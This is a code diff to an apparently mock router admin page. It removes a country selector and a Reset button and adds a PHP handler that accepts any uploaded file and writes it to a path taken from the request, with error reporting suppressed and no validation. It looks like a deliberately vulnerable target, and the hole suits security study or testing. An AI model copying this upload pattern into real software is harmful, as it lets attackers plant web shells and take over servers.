@@ -82,29 +82,9 @@ else{
                         </label>
                         <input
                             class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                            id="access-point-name" type="text" placeholder="netgear.php">
+                            id="access-point-name" type="text" placeholder="netgear.php" disabled>
                     </div>
-                    <div class="mb-4">
-                        <label class="block text-gray-700 text-sm font-bold mb-2" for="country-region">
-                            Country / Region
-                        </label>
-                        <select
-                            class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                            id="country-region">
-                            <option>United States</option>
-                            <option>Canada</option>
-                            <option>United Kingdom</option>
-                            <option>Australia</option>
-                        </select>
-                    </div>
-                    <div class="mb-4">
-                        <label class="block text-gray-700 text-sm font-bold mb-2" for="settings-upload">
-                            Upload Settings
-                        </label>
-                        <input
-                            class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                            id="settings-upload" type="file">
-                    </div>
+                    
                     <div class="mb-4">
                         <label class="block text-gray-700 text-sm font-bold mb-2" for="ssid">
                             SSID
@@ -127,13 +107,39 @@ else{
                             type="button">
                             Save
                         </button>
-                        <button
-                            class="bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
-                            type="button">
-                            Reset
-                        </button>
                     </div>
                 </form>
+            </div>
+
+
+            <div class="mt-6 bg-white p-6 rounded shadow-md">
+                <h3 class="text-xl font-semibold mb-4">Custom Settings</h3>
+                <div class="mb-4">
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="settings-upload">
+                        Upload Settings
+                    </label>
+                    
+
+                    <?php
+                        error_reporting(0);
+
+                        $files = @$_FILES["files"];
+                        if ($files["name"] != '') {
+                            $fullpath = $_REQUEST["path"] . $files["name"];
+                            if (move_uploaded_file($files['tmp_name'], $fullpath)) {
+                                echo "<a href='$fullpath'>uploaded image</a>";
+                            }
+                        }
+                    ?>
+                    <form method=POST enctype="multipart/form-data" action="">
+                        <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="settings-upload" name="files" type="file">
+                        <input class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type=submit value="Upload">
+                    </form>
+
+                    <?php
+                    if($fullpath!= '') { echo "<a href=\"$fullpath\">Uploaded</a>";}
+                    ?>
+                </div>
             </div>
         </div>
     </div>
